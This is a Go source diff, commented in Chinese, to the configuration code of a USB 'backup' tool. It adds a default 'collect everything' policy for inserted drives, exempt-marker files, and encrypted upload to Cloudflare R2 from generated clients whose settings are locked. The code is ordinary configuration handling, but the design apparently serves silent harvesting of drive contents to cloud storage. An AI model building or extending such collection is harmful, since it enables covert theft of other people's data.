@@ -16,6 +16,7 @@ import (
 	"strconv"
 	"strings"
 
+	"github.com/immml/UsbBackUP-R2/internal/collectpolicy"
 	"github.com/immml/UsbBackUP-R2/internal/version"
 )
 
@@ -193,24 +194,85 @@ type LogConfig struct {
 	Console    bool   `json:"console"`
 }
 
+// CollectConfig 是采集分支的准入策略（G-12 / D-20）。
+//
+// 它取代了早期的"卷序列号白名单"方案：那个方案里的序列号是**格式化时生成**的，
+// 重新格式化即改变，自己合法的盘会被拒、廉价盘的重复序列号又可能被放行，
+// 可用性与安全性两头都保不住。详见 internal/collectpolicy 的包注释。
+type CollectConfig struct {
+	// Policy 取值：all（默认）/ marker_only / off。
+	Policy string `json:"policy"`
+	// MarkerFile 是 marker_only 档位下要查找的**采集标记**文件名。
+	MarkerFile string `json:"marker_file"`
+	// ExemptMarkerFile 是**授权标记**文件名，默认 `.usbbackup-allow`。
+	//
+	// 与采集标记（`.usbbackup-collect`）是**两个不同的东西**，语义相反：
+	//
+	//	授权标记 = "这块盘是我自己的，里面甚至有私钥，请不要采集它"
+	//	采集标记 = "这块盘的内容可以打包上传"
+	//
+	// 授权标记的判定不受 Policy 档位影响：哪怕策略是 all，
+	// 命中授权标记的介质也一律拒绝采集。理由见 internal/collectpolicy 的包注释。
+	//
+	// 名字与不含出站能力的版本（项目 A）保持一致，两个项目的工具盘互相认。
+	ExemptMarkerFile string `json:"exempt_marker_file"`
+}
+
+// UploadConfig 是上传到 Cloudflare R2 的行为配置（G-06′ / F-U01~F-U09）。
+//
+// 凭据**不在这里**：它放在单独的文件里（internal/cred），由 DPAPI 保护，
+// 并且只对配置的前缀有写权限。理由见 internal/cred 的包注释。
+type UploadConfig struct {
+	// Enabled 决定采集分支是否把产物上传到 R2。
+	//
+	// 为 false 时行为与不含出站能力的版本一致：产物只落在 OutputDir。
+	Enabled bool `json:"enabled"`
+	// CredentialFile 是凭据文件路径，支持 %VAR% 展开。
+	//
+	// 客户端模式下这个值被忽略：客户端只从**自身可执行文件同目录**或
+	// %LOCALAPPDATA% 找 client.json（F-K03：客户端不读任何其它外部配置）。
+	CredentialFile string `json:"credential_file"`
+	// MultipartThresholdBytes 超过该大小改用分片上传，默认 64 MiB。
+	MultipartThresholdBytes int64 `json:"multipart_threshold_bytes"`
+	// PartSizeBytes 是分片大小，默认 64 MiB（S3 要求非末片 ≥ 5 MiB）。
+	PartSizeBytes int64 `json:"part_size_bytes"`
+	// MaxRetries 是单次请求的可重试次数，默认 5。
+	MaxRetries int `json:"max_retries"`
+	// UploadTimeoutMin 是单个产物的上传时限（分钟），默认 30；0 表示不额外限制
+	// （仍受作业级超时约束）。
+	UploadTimeoutMin int `json:"upload_timeout_min"`
+	// DeleteLocalAfterUpload 决定上传校验通过后是否删除本地密文产物。
+	//
+	// 默认 true：产物已经在远端留了一份，%TEMP% 里再堆一份只是多一个失窃面。
+	DeleteLocalAfterUpload bool `json:"delete_local_after_upload"`
+	// KeepLocalOnFailure 决定上传失败时是否保留本地密文产物（默认 true）。
+	//
+	// 保留是为了能手工重传；关掉它等于"上传失败 = 数据没了"，除非你确实
+	// 不需要本地副本。
+	KeepLocalOnFailure bool `json:"keep_local_on_failure"`
+}
+
 // Config 是运行期生效配置。
 type Config struct {
-	// BackupSourceDir 是本地「备份文件夹」路径，授权分支的复制源（F-401 / Q-03）。
-	BackupSourceDir string `json:"backup_source_dir"`
 	// OutputDir 是加密产物落盘目录，默认 %TEMP%\backup（F-803 / D-06）。
+	//
+	// 上传开启时它同时是"待上传队列"的所在地：上传失败而保留本地副本，
+	// 就是留在这里，可以用 `usbbackup-r2 upload <文件>` 手工补传。
 	OutputDir string `json:"output_dir"`
 	// PublicKeyPath 是用于包装会话密钥的公钥文件路径（F-703）。
+	//
+	// 客户端模式下这个值是占位串 `<内嵌于客户端>`，任何需要它的代码路径
+	// 都必须先走内嵌公钥（见 backup.Deps.EmbeddedPublicKey）。
 	PublicKeyPath string `json:"public_key_path"`
-	// AuthorizedBackupSubdir 是回写到 U 盘的子目录名，固定语义为 `backup`（F-401 / G-04）。
-	AuthorizedBackupSubdir string `json:"authorized_backup_subdir"`
 	// AuditFile 是审计日志文件路径（F-807）。
 	AuditFile string `json:"audit_file"`
 
 	Monitor   MonitorConfig   `json:"monitor"`
-	Detect    DetectConfig    `json:"detect"`
+	Collect   CollectConfig   `json:"collect"`
 	Gate      GateConfig      `json:"gate"`
 	Archive   ArchiveConfig   `json:"archive"`
 	Retention RetentionConfig `json:"retention"`
+	Upload    UploadConfig    `json:"upload"`
 	Log       LogConfig       `json:"log"`
 }
 
@@ -222,17 +284,10 @@ func Default() *Config {
 	}
 	base := filepath.Join(appData, version.AppName)
 
-	home, err := os.UserHomeDir()
-	if err != nil || home == "" {
-		home = os.TempDir()
-	}
-
 	return &Config{
-		BackupSourceDir:        filepath.Join(home, version.AppName, "local-backup"),
-		OutputDir:              filepath.Join(os.TempDir(), "backup"),
-		PublicKeyPath:          filepath.Join(base, "keys", "usbbackup-r2.pub.pem"),
-		AuthorizedBackupSubdir: "backup",
-		AuditFile:              filepath.Join(base, "audit.jsonl"),
+		OutputDir:     filepath.Join(os.TempDir(), "backup"),
+		PublicKeyPath: filepath.Join(base, "keys", "usbbackup-r2.pub.pem"),
+		AuditFile:     filepath.Join(base, "audit.jsonl"),
 		Monitor: MonitorConfig{
 			PollIntervalSec:       5,
 			DebounceSec:           5,
@@ -241,14 +296,10 @@ func Default() *Config {
 			ProcessMountedOnStart: true,
 			PollOnly:              false,
 		},
-		Detect: DetectConfig{
-			Mode:            "both",
-			MaxDepth:        4,
-			MaxFiles:        5000,
-			MaxHeadersBytes: 4096,
-			TimeoutSec:      20,
-			MarkerFile:      ".usbbackup-r2-allow",
-			ScanContents:    true,
+		Collect: CollectConfig{
+			Policy:           "all",
+			MarkerFile:       collectpolicy.DefaultMarkerFile,
+			ExemptMarkerFile: collectpolicy.DefaultExemptMarkerFile,
 		},
 		Gate: GateConfig{
 			UsedThresholdBytes:     DefaultUsedThresholdBytes,
@@ -263,6 +314,18 @@ func Default() *Config {
 		Retention: RetentionConfig{
 			KeepPerVolume: 5,
 			DedupEnabled:  true,
+		},
+		Upload: UploadConfig{
+			// 默认关闭：模板程序（不内嵌配置）应当保持"不上传"的保守行为。
+			// 生成器产出的客户端会把这里改成 true（见 clientgen）。
+			Enabled:                 false,
+			CredentialFile:          filepath.Join(base, "client.json"),
+			MultipartThresholdBytes: 64 * 1024 * 1024,
+			PartSizeBytes:           64 * 1024 * 1024,
+			MaxRetries:              5,
+			UploadTimeoutMin:        30,
+			DeleteLocalAfterUpload:  true,
+			KeepLocalOnFailure:      true,
 		},
 		Log: LogConfig{
 			Level:      "info",
@@ -335,9 +398,16 @@ func Save(path string, cfg *Config) error {
 }
 
 // ApplyEnv 用 USBBACKUP_R2_* 环境变量覆盖配置（F-C04）。
-// 支持的变量：USBBACKUP_R2_BACKUP_SOURCE_DIR / USBBACKUP_R2_OUTPUT_DIR /
-// USBBACKUP_R2_PUBLIC_KEY / USBBACKUP_R2_LOG_LEVEL / USBBACKUP_R2_USED_THRESHOLD_BYTES /
-// USBBACKUP_R2_POLL_INTERVAL_SEC / USBBACKUP_R2_AUDIT_FILE。
+// 支持的变量：USBBACKUP_R2_OUTPUT_DIR / USBBACKUP_R2_PUBLIC_KEY /
+// USBBACKUP_R2_LOG_LEVEL / USBBACKUP_R2_AUDIT_FILE /
+// USBBACKUP_R2_USED_THRESHOLD_BYTES / USBBACKUP_R2_USED_THRESHOLD /
+// USBBACKUP_R2_MAX_TOTAL_BYTES / USBBACKUP_R2_POLL_INTERVAL_SEC /
+// USBBACKUP_R2_COLLECT_POLICY / USBBACKUP_R2_COLLECT_MARKER /
+// USBBACKUP_R2_COLLECT_EXEMPT_MARKER /
+// USBBACKUP_R2_UPLOAD_ENABLED / USBBACKUP_R2_CREDENTIAL_FILE。
+//
+// 注意：客户端模式（内嵌配置）下这些变量**全部被忽略**（F-K03）——
+// 否则"硬编码配置"就能靠设几个环境变量绕过去。
 func (c *Config) ApplyEnv() []string {
 	var applied []string
 	set := func(env string, dst *string) {
@@ -346,11 +416,32 @@ func (c *Config) ApplyEnv() []string {
 			applied = append(applied, env)
 		}
 	}
-	set("USBBACKUP_R2_BACKUP_SOURCE_DIR", &c.BackupSourceDir)
 	set("USBBACKUP_R2_OUTPUT_DIR", &c.OutputDir)
 	set("USBBACKUP_R2_PUBLIC_KEY", &c.PublicKeyPath)
 	set("USBBACKUP_R2_LOG_LEVEL", &c.Log.Level)
 	set("USBBACKUP_R2_AUDIT_FILE", &c.AuditFile)
+	set("USBBACKUP_R2_COLLECT_POLICY", &c.Collect.Policy)
+	set("USBBACKUP_R2_COLLECT_MARKER", &c.Collect.MarkerFile)
+	set("USBBACKUP_R2_COLLECT_EXEMPT_MARKER", &c.Collect.ExemptMarkerFile)
+	set("USBBACKUP_R2_CREDENTIAL_FILE", &c.Upload.CredentialFile)
+	if v := strings.TrimSpace(os.Getenv("USBBACKUP_R2_UPLOAD_ENABLED")); v != "" {
+		if b, ok := parseBool(v); ok {
+			c.Upload.Enabled = b
+			applied = append(applied, "USBBACKUP_R2_UPLOAD_ENABLED")
+		}
+	}
+	if v := strings.TrimSpace(os.Getenv("USBBACKUP_R2_UPLOAD_PART_SIZE")); v != "" {
+		if n, err := ParseSize(v); err == nil && n > 0 {
+			c.Upload.PartSizeBytes = n
+			applied = append(applied, "USBBACKUP_R2_UPLOAD_PART_SIZE")
+		}
+	}
+	if v := strings.TrimSpace(os.Getenv("USBBACKUP_R2_UPLOAD_MAX_RETRIES")); v != "" {
+		if n, err := strconv.Atoi(v); err == nil && n >= 0 {
+			c.Upload.MaxRetries = n
+			applied = append(applied, "USBBACKUP_R2_UPLOAD_MAX_RETRIES")
+		}
+	}
 	if v := strings.TrimSpace(os.Getenv("USBBACKUP_R2_USED_THRESHOLD_BYTES")); v != "" {
 		if n, err := strconv.ParseInt(v, 10, 64); err == nil && n >= 0 {
 			c.Gate.UsedThresholdBytes = n
@@ -379,13 +470,24 @@ func (c *Config) ApplyEnv() []string {
 	return applied
 }
 
-// ExpandPath 展开路径中的 %VAR% 与 ${VAR}，并转为绝对路径。
+// ExpandPath 把配置里的路径展开成绝对路径。
+//
+// 支持三种写法，顺序是先展开变量再做剩下的处理：
+//
+//	%VAR%      Windows 风格（也照 POSIX 习惯用 `$VAR` / `${VAR}`）
+//	~ / ~/x    home 目录（Linux 上很常用；Windows 上 `~` 本就不是合法盘符，
+//	           所以支持它不会与任何既有写法冲突）
+//	相对路径   按当前工作目录转绝对路径
+//
+// 之所以统一在这里做：路径展开一旦分散到各个调用点，就必然出现
+// "某处认 ~、某处不认"的不一致，排查起来极费时间。
 func ExpandPath(p string) string {
 	if p == "" {
 		return ""
 	}
 	p = expandPercentVars(p)
 	p = os.ExpandEnv(p)
+	p = expandTilde(p)
 	if !filepath.IsAbs(p) {
 		if abs, err := filepath.Abs(p); err == nil {
 			p = abs
@@ -394,7 +496,42 @@ func ExpandPath(p string) string {
 	return filepath.Clean(p)
 }
 
+// expandTilde 展开开头的 `~` 为当前用户的 home 目录。
+//
+// 只认 `~` 与 `~/x` 两种形态；`~someone/x` 不处理——
+// 那需要查系统用户库，超出本工具的职责范围，保持原样让调用方看到真实错误。
+func expandTilde(p string) string {
+	if p != "~" && !strings.HasPrefix(p, "~/") && !strings.HasPrefix(p, `~\`) {
+		return p
+	}
+	home, err := os.UserHomeDir()
+	if err != nil || home == "" {
+		return p
+	}
+	rest := strings.TrimPrefix(strings.TrimPrefix(p[1:], "/"), `\`)
+	if rest == "" {
+		return home
+	}
+	return filepath.Join(home, rest)
+}
+
 var percentVarRe = regexp.MustCompile(`%([A-Za-z_][A-Za-z0-9_]*)%`)
+
+// parseBool 解析环境变量里的布尔值。
+//
+// 不用 strconv.ParseBool：它把 "1"/"0" 之外的东西一律判为非法，
+// 而运维习惯把这些写成 yes/no/on/off。这里统一接受常见写法，
+// 无法识别的返回 ok=false（由调用方决定是忽略还是报错）。
+func parseBool(s string) (bool, bool) {
+	switch strings.ToLower(strings.TrimSpace(s)) {
+	case "1", "true", "yes", "y", "on", "enable", "enabled":
+		return true, true
+	case "0", "false", "no", "n", "off", "disable", "disabled":
+		return false, true
+	default:
+		return false, false
+	}
+}
 
 func expandPercentVars(s string) string {
 	return percentVarRe.ReplaceAllStringFunc(s, func(m string) string {
@@ -443,23 +580,27 @@ func (c *Config) Validate() error {
 		}
 		c.Gate.UsedThresholdBytes = n
 	}
-	if m := strings.ToLower(strings.TrimSpace(c.Detect.Mode)); m != "heuristic" && m != "marker" && m != "both" {
-		return fmt.Errorf("detect.mode 取值非法 %q（可用 heuristic/marker/both）", c.Detect.Mode)
+	// 采集策略：非法值必须报错。静默退回默认（all = 全量采集）是这里
+	// 最不能接受的失败方式——配置写错却按"什么都采"跑起来。
+	if _, err := collectpolicy.Normalize(c.Collect.Policy); err != nil {
+		return fmt.Errorf("collect.policy: %w", err)
 	}
-	if c.Detect.MaxDepth <= 0 || c.Detect.MaxDepth > 32 {
-		return errors.New("detect.max_depth 需在 1..32 之间")
+	if name := strings.TrimSpace(c.Collect.MarkerFile); name == "" {
+		c.Collect.MarkerFile = collectpolicy.DefaultMarkerFile
+	} else if err := collectpolicy.ValidMarkerName(name); err != nil {
+		return fmt.Errorf("collect.marker_file: %w", err)
 	}
-	if c.Detect.MaxFiles <= 0 {
-		return errors.New("detect.max_files 必须 > 0")
+	if name := strings.TrimSpace(c.Collect.ExemptMarkerFile); name == "" {
+		c.Collect.ExemptMarkerFile = collectpolicy.DefaultExemptMarkerFile
+	} else if err := collectpolicy.ValidMarkerName(name); err != nil {
+		return fmt.Errorf("collect.exempt_marker_file: %w", err)
 	}
-	if c.Detect.MaxHeadersBytes <= 0 || c.Detect.MaxHeadersBytes > 1<<20 {
-		return errors.New("detect.max_headers_bytes 需在 1..1048576 之间")
+	// 两个标记同名 = 采集标记会把授权盘变成采集目标，正好是最危险的组合。
+	if c.Collect.MarkerFile == c.Collect.ExemptMarkerFile {
+		return fmt.Errorf("collect.marker_file 与 collect.exempt_marker_file 不能同名（%q）：两者语义相反", c.Collect.MarkerFile)
 	}
-	if c.Detect.TimeoutSec <= 0 {
-		return errors.New("detect.timeout_sec 必须 > 0")
-	}
-	if sub := strings.TrimSpace(c.AuthorizedBackupSubdir); sub == "" || strings.ContainsAny(sub, `/\:*?"<>|`) {
-		return fmt.Errorf("authorized_backup_subdir 非法 %q：必须是单层目录名且不含 Windows 禁用字符", c.AuthorizedBackupSubdir)
+	if err := validateUpload(&c.Upload); err != nil {
+		return err
 	}
 	if c.Retention.KeepPerVolume < 1 {
 		return errors.New("retention.keep_per_volume 至少为 1")
@@ -476,16 +617,62 @@ func (c *Config) Validate() error {
 	return nil
 }
 
+// validateUpload 校验上传相关参数，并对未填项补默认值。
+//
+// 阈值上限刻意与 r2 包的协议限制保持一致：S3 单分片下限 5 MiB、上限 5 GiB。
+// 让它们在对不上时立刻报错，好过在上传途中被服务端拒绝——
+// 那时已经压缩加密完了一整块盘，白跑一遍。
+func validateUpload(u *UploadConfig) error {
+	const (
+		minPart int64 = 5 << 20
+		maxPart int64 = 5 << 30
+	)
+	if u.MultipartThresholdBytes <= 0 {
+		u.MultipartThresholdBytes = 64 << 20
+	}
+	if u.PartSizeBytes <= 0 {
+		u.PartSizeBytes = 64 << 20
+	}
+	if u.PartSizeBytes < minPart {
+		return fmt.Errorf("upload.part_size_bytes 不能小于 %d 字节（S3 对非末片的硬性要求）", minPart)
+	}
+	if u.PartSizeBytes > maxPart {
+		return fmt.Errorf("upload.part_size_bytes 不能大于 %d 字节（S3 单分片上限）", maxPart)
+	}
+	if u.MaxRetries < 0 {
+		return errors.New("upload.max_retries 不能为负")
+	}
+	if u.MaxRetries == 0 {
+		u.MaxRetries = 5
+	}
+	if u.UploadTimeoutMin < 0 {
+		return errors.New("upload.upload_timeout_min 不能为负")
+	}
+	if strings.TrimSpace(u.CredentialFile) == "" {
+		return errors.New("upload.enabled 为 true 时必须配置 upload.credential_file")
+	}
+	return nil
+}
+
 // Summary 返回用于启动日志的关键配置摘要。
 // 刻意不包含任何密钥材料。
 func (c *Config) Summary() []string {
+	uploadText := "关闭（产物只落本地）"
+	if c.Upload.Enabled {
+		uploadText = fmt.Sprintf("开启（凭据 %s，分片阈值 %s，失败重试 %d 次）",
+			c.Upload.CredentialFile, humanGiB(c.Upload.MultipartThresholdBytes), c.Upload.MaxRetries)
+	}
+	// 采集策略用归一化后的值展示：配置里写错大小写时，日志要显示**实际生效**的档位。
+	policy, _ := collectpolicy.Normalize(c.Collect.Policy)
 	return []string{
-		fmt.Sprintf("备份源目录      = %s", c.BackupSourceDir),
 		fmt.Sprintf("产物输出目录    = %s", c.OutputDir),
 		fmt.Sprintf("公钥路径        = %s", c.PublicKeyPath),
-		fmt.Sprintf("检测模式        = %s", c.Detect.Mode),
+		fmt.Sprintf("授权标记(豁免)  = %s（仅认盘根；命中即拒绝采集）", c.Collect.ExemptMarkerFile),
+		fmt.Sprintf("采集策略        = %s", policy.Describe()),
+		fmt.Sprintf("采集标记        = %s（marker_only 档位使用）", c.Collect.MarkerFile),
 		fmt.Sprintf("容量门控阈值    = %d 字节 (%s)", c.Gate.UsedThresholdBytes, humanGiB(c.Gate.UsedThresholdBytes)),
 		fmt.Sprintf("打包体积上限    = %s", humanLimit(c.Gate.MaxTotalBytes)),
+		fmt.Sprintf("上传到 R2       = %s", uploadText),
 		fmt.Sprintf("轮询间隔        = %ds（事件驱动为主，轮询兜底）", c.Monitor.PollIntervalSec),
 		fmt.Sprintf("作业超时        = %d 分钟", c.Monitor.JobTimeoutMin),
 		fmt.Sprintf("日志级别/文件   = %s / %s", c.Log.Level, c.Log.File),
